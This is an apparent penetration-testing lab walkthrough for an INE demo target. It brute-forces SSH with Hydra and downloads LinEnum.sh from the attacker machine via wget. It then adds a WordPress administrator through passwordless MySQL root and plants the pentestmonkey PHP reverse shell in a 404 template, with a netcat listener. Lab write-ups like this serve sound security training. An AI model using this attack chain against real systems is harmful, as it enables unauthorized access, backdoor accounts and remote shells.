## Use nmap to scan the target

    nmap -sS -sV demo.ine.local

read the open ports and we have ssh,telnet and apache.

## Use Hydra for ssh

    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt demo.ine.local ssh

### Found the credentials

    webadmin | denise

### Login via ssh

    ssh webadmin@demo.ine.local

### Let's check the list of processes:

    ps aux


Manual recon can be a bit tedious and time-consuming process. Instead, we can use handy scripts like LinEnum.sh

    https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

 run a python-based HTTP server in the folder where this file is located:

    python3 -m http.server 80

Now head over to the terminal with the SSH session and check the IP address of the target web server:

    ip addr

The IP address of the target web server is

    192.8.52.3

This means that the attacker machine is at IP

    192.8.52.2


### Download LinEnum.sh from attacker's machine to target's machine

check for curl or wget if available on the target's machine

    curl
    wget

Download using wget

    wget http://192.8.52.2/LinEnum.sh


Now also have to make the script executable:

    chmod +x LinEnum.sh


As the script reports its findings, you would notice something interesting:

    [+] We can connect to the mysql service as 'root' without a password


Connect to the MySQL service as the root user.

    mysql -u root 

Checking the list of available databases:


    show databases;

Let's switch to the

    app

database and check the list of tables in it:

    use app;
    show tables;

### Add a new user

    INSERT INTO `wp_users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES ('appuser', MD5('appuser_passwd'), 'appuser', 'appuser@ine.local', '0');


<br/>

    INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM wp_users), 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');

<br/>

    INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM wp_users), 'wp_user_level', '10');


### Check the new user

    SELECT * from wp_users;

### Login in with the new user

<br/>

username: appuser

password: appuser_passwd

<br/>

## Edit the 404 page template to gain a reverse shell

<br/>

For that, click on Appearance -> Editor then click 404.php

<br/>

### Replace the code with a reverse shell code from pentest monkey

    cat /usr/share/webshells/php/php-reverse-shell.php

Change the ip to the address of your machine

Start a Netcat listener of the port specified in the code

    nc -nvlp 1234

Now visit the 404 page again and you should see the reverse shell in the command line.